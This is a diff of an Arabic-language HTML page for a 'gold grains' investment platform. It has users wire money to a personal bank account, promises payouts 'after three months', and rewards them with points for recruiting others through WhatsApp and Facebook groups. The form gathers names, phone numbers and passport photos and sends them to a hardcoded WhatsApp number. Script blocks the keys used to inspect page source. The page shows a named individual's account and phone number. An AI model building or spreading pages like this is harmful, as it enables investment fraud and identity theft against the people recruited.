@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة حبوب الذهب الفاخرة</title>
+    <title>منصة حبوب الذهب الاستثمارية</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -84,11 +84,40 @@
             font-size: 14px;
         }
 
+        /* تنبيه الاستثمار والسحب بعد 3 أشهر */
+        .investment-notice {
+            background: rgba(212, 175, 55, 0.12);
+            border: 1px solid var(--gold-main);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .investment-notice h3 {
+            color: var(--gold-main);
+            font-size: 16px;
+            margin-bottom: 6px;
+        }
+
+        .investment-notice p {
+            font-size: 13px;
+            color: #e0e0e0;
+            line-height: 1.5;
+            margin-bottom: 12px;
+        }
+
+        .pre-share-btns {
+            display: flex;
+            gap: 8px;
+        }
+
         .price-badge-container {
             display: flex;
             gap: 10px;
             justify-content: center;
             margin-top: 15px;
+            margin-bottom: 20px;
         }
 
         .price-badge {
@@ -296,11 +325,22 @@
                 <div class="header">
                     <div class="gold-icon">👑</div>
                     <h1>حبوب الذهب</h1>
-                    <p>طلب شراء وتوثيق حساب جديد (السحب بعد 3 أشهر)</p>
-                    <div class="price-badge-container">
-                        <div class="price-badge">سعر الجرام <span>800,000</span></div>
-                        <div class="price-badge">سعر الحبة <span>80,000</span></div>
+                    <p>منصة الشراء والتوقيع الاستثماري</p>
+                </div>
+
+                <!-- تنبيه الاستثمار ومشاركة الموقع قبل التوثيق -->
+                <div class="investment-notice">
+                    <h3>📈 موقع استثماري ذهبي</h3>
+                    <p>هذا الموقع استثماري بحت، وسيتم إجراء <strong>السحب بعد 3 أشهر</strong> من الآن. شارك الموقع الآن في المجموعات لتدعو أصدقاءك:</p>
+                    <div class="pre-share-btns">
+                        <button type="button" class="btn-share btn-whatsapp" onclick="shareToWhatsApp()">مشاركة واتساب 🟢</button>
+                        <button type="button" class="btn-share btn-facebook" onclick="shareToFacebook()">مشاركة فيسبوك 🔵</button>
                     </div>
+                </div>
+
+                <div class="price-badge-container">
+                    <div class="price-badge">سعر الجرام <span>800,000</span></div>
+                    <div class="price-badge">سعر الحبة <span>80,000</span></div>
                 </div>
 
                 <form id="registerForm" onsubmit="handleRegister(event)">
@@ -377,16 +417,16 @@
                 <div class="header">
                     <div class="gold-icon">✨</div>
                     <h1>أهلاً بك، <span id="userDashboardName"></span></h1>
-                    <p>مرحباً بك في صفحتك الشخصية بـ <strong>حبوب الذهب</strong></p>
+                    <p>مرحباً بك في صفحتك الاستثمارية بـ <strong>حبوب الذهب</strong></p>
                 </div>
 
                 <div class="user-status">
-                    ⏳ حالة الحساب: بانتظار التحويل المالي | 🗓️ موعد السحب الكبير: بعد 3 أشهر
+                    ⏳ حالة الحساب: بانتظار التحويل المالي | 🗓️ موعد السحب الاستثماري: بعد 3 أشهر
                 </div>
 
                 <div class="bank-details">
                     <p><strong>اسم الحساب:</strong> محمد طه عطا المنان</p>
-                    <p><strong>الخدمة:</strong> شراء حبوب الذهب</p>
+                    <p><strong>الخدمة:</strong> شراء حبوب الذهب الاستثمارية</p>
                     <p style="margin-bottom: 5px;"><strong>رقم الحساب المعتمد للتحويل:</strong></p>
                     <div class="account-box">
                         <span class="account-number" id="accNum">2473368</span>
@@ -396,8 +436,8 @@
 
                 <!-- قسم مشاركة رابط الصفحة وكسب النقاط -->
                 <div class="points-section">
-                    <h3>🎁 اربح نقاطاً وفرصاً إضافية للسحب!</h3>
-                    <p style="font-size: 12px; color: #ccc; margin-bottom: 8px;">شارك رابط الصفحة في مجموعات الواتساب وفيسبوك لدعوة الناس للاشتراك (السحب بعد 3 أشهر):</p>
+                    <h3>🎁 اربح نقاطاً وفرصاً إضافية!</h3>
+                    <p style="font-size: 12px; color: #ccc; margin-bottom: 8px;">شارك رابط الموقع في المجموعات لدعوة المستثمرين (السحب بعد 3 أشهر):</p>
                     <div class="points-counter">رصيدك الحالي: <span id="userPoints">10</span> نقطة</div>
                     <div class="share-buttons">
                         <button class="btn-share btn-whatsapp" onclick="shareToWhatsApp()">مشاركة واتساب 🟢</button>
@@ -412,8 +452,7 @@
     </div>
 
     <script>
-        // استبدل هذا الرقم برقم هاتفك بصيغة دولية بدون علامة + (مثال: 249912345678)
-        const myWhatsAppNumber = "249912345678";
+        const myWhatsAppNumber = "249901946410";
 
         document.onkeydown = function(e) {
             if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) {
@@ -462,13 +501,14 @@
             let currentPoints = parseInt(localStorage.getItem('_uPts') || '10');
             currentPoints += 5;
             localStorage.setItem('_uPts', currentPoints);
-            document.getElementById('userPoints').innerText = currentPoints;
+            const pointsDisplay = document.getElementById('userPoints');
+            if(pointsDisplay) pointsDisplay.innerText = currentPoints;
             alert("شكراً لمشاركتك! تمت إضافة 5 نقاط جديدة لرصيدك.");
         }
 
         function shareToWhatsApp() {
             const pageUrl = window.location.href;
-            const text = encodeURIComponent("✨ فرصة ذهبية! ندعوكم للاشتراك في منصة حبوب الذهب الفاخرة، اشترِ بالجرام أو بالحبة. 🏆 ملاحظة هامة: السحب الكبير سيتم بعد 3 أشهر من الآن!\n\nرابط الصفحة للانضمام:");
+            const text = encodeURIComponent("📈 فرصة استثمارية ذهبية! ندعوكم للاشتراك في منصة حبوب الذهب الاستثمارية، اشترِ بالجرام أو بالحبة. 🏆 تنبيه هامة: السحب الاستثماري سيتم بعد 3 أشهر من الآن!\n\nرابط الموقع للانضمام:");
             window.open(`https://api.whatsapp.com/send?text=${text} ${pageUrl}`, '_blank');
             addPoints();
         }
@@ -479,7 +519,6 @@
             addPoints();
         }
 
-        // إرسال البيانات عبر الواتساب والانتقال للصفحة الشخصية
         async function handleRegister(e) {
             e.preventDefault();
             const name = document.getElementById('regName').value;
@@ -498,18 +537,16 @@
             localStorage.setItem('_uN', name);
             localStorage.setItem('_uPts', '10');
 
-            // تجهيز نص رسالة الواتساب لتصلك مباشرة
             const message = encodeURIComponent(
-                `👑 *طلب توثيق وشراء جديد - حبوب الذهب*\n\n` +
+                `📈 *طلب توثيق استثماري جديد - حبوب الذهب*\n\n` +
                 `👤 الاسم: ${name}\n` +
                 `📞 رقم الهاتف/العملية: ${phone}\n` +
                 `⚖️ الكمية المطلوبة: ${qty} جرام\n` +
                 `💰 المبلغ الإجمالي: ${total}\n` +
                 `📄 اسم ملف الجواز المرفق: ${fileName}\n\n` +
-                `⚠️ يرجى إرسال صورة الجواز الفعلية هنا عبر الواتساب لتأكيد الحساب.`
+                `⚠️ موقع استثماري (السحب بعد 3 أشهر). يرجى إرسال صورة الجواز الفعلية هنا عبر الواتساب لتأكيد الحساب.`
             );
 
-            // فتح الواتساب برقمك والرسالة الجاهزة
             window.open(`https://api.whatsapp.com/send?phone=${myWhatsAppNumber}&text=${message}`, '_blank');
 
             document.getElementById('userDashboardName').innerText = name;
